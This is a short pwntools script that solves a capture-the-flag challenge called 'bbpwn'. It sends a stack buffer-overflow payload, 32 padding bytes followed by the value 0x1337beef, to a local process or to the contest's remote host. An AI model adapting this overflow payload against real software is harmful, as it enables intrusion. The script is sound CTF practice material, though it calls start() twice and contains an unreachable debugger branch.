from pwn import *

BINARY = './bbpwn'
HOST = 'challenges.tamuctf.com'
PORT = 4252

elf = ELF(BINARY)
context.terminal = ['tmux', 'split-window']

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    if not args.REMOTE and args.GDB:
        gdb.attach(process(BINARY))
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)



p = start()

p = start()
if args.GDB:
    gdb.attach(p, 'b gets')

print(p.recvuntil('string: '))

win_string = p64(0x1337beef)
exploit = b'A'*0x10 + b'B'*16 + win_string

p.sendline(exploit)
print(p.recvline())
